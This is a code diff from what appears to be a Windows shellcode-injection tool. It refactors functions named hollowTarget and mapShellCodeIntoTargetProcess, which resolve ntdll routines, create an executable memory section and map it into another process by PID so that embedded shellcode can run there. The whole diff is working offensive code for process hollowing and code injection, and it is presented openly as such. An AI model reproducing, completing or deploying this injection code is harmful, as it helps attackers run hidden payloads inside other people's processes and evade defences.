@@ -2,6 +2,7 @@
 #include "define.h"
 #include "datastruct.h"
 #include "hkutil.h"
+#include "hkfunc.h"
 #include "hkprocess.h"
 #include "hklocal.h"
 
@@ -19,19 +20,10 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   ULONG retLength = 0;
   LUID privID{};
 
-  // create function objects
-  TUnmapViewOfSection hkUnmapViewOfSection =
-      (TUnmapViewOfSection)hk_util::procAddr("ntdll", "ZwUnmapViewOfSection");
-
-  // UNUSED
-  TCreateUserThread hkCreateUserThread =
-      (TCreateUserThread)hk_util::procAddr("ntdll", "RtlCreateUserThread");
-  TResumeProcess hkResumeProcess =
-      (TResumeProcess)hk_util::procAddr("ntdll", "NtResumeProcess");
   //
   /*
   //LOGn("Setting debug privilege...\t\t");
-  if (hk_util::setLocalPrivilege("SeDebugPrivilege")) {  // unused right now
+  if (util::setLocalPrivilege("SeDebugPrivilege")) {  // unused right now
     //LOG("Failure.");
     //ERRCHK;
   };
@@ -39,7 +31,7 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   LOG("Creating target process data structure.");*/
 
   hkProcess targetProc(processPath);
-  hkShellCode shellCode(hk_util::shellCode, hk_util::shellCodeSize);
+  hkShellCode shellCode(util::shellCode, util::shellCodeSize);
 
   if (!(pTgtSectionView = mapShellCodeIntoTargetProcess(&targetProc, &shellCode))) {
     LOG(logError, "Shell code injection failed. Error code: %d", GetLastError());
@@ -69,25 +61,16 @@ void* hk_local::mapShellCodeIntoTargetProcess(hkProcess* pTarget, hkShellCode* p
   LPVOID lpSectionLocal = nullptr, lpSectionTarget = nullptr;
   sectionSize.QuadPart = pCode->size;
 
-  TCreateSection hkCreateSection =
-      (TCreateSection)hk_util::procAddr("ntdll", "NtCreateSection");
-  TMapViewOfSection hkMapViewOfSection =
-      (TMapViewOfSection)hk_util::procAddr("ntdll", "NtMapViewOfSection");
-
   LOG(logOK, "Creating section at 0x%x, size %d.", hkCreateSection, sectionSize.QuadPart);
-  hkCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
-                  PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+  hkCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
   LOG(logOK, "Mapping local section view...");
-  hkMapViewOfSection(hSection, GetCurrentProcess(), &lpSectionLocal, NULL, NULL,
-                     NULL, &pCode->size, 2, NULL, PAGE_READWRITE);
+  hkMapViewOfSection(hSection, GetCurrentProcess(), &lpSectionLocal, NULL, NULL, NULL, &pCode->size, 2, NULL, PAGE_READWRITE);
   LOG(logOK, "Mapped local section view at 0x%x", lpSectionLocal);
 
   LOG(logOK, "Mapping target section view for PID %d...", pTarget->dwProcessId);
 
-  if (hkMapViewOfSection(hSection, pTarget->hProcess, &lpSectionTarget,
-                         NULL, NULL, NULL, &pCode->size, 2, NULL,
-                         PAGE_EXECUTE_READ) != 0) {
+  if (hkMapViewOfSection(hSection, pTarget->hProcess, &lpSectionTarget, NULL, NULL, NULL, &pCode->size, 2, NULL, PAGE_EXECUTE_READ) != 0) {
     LOG(logError, "Failed to map target section view. Error code: %d", GetLastError());
     return nullptr;
   };
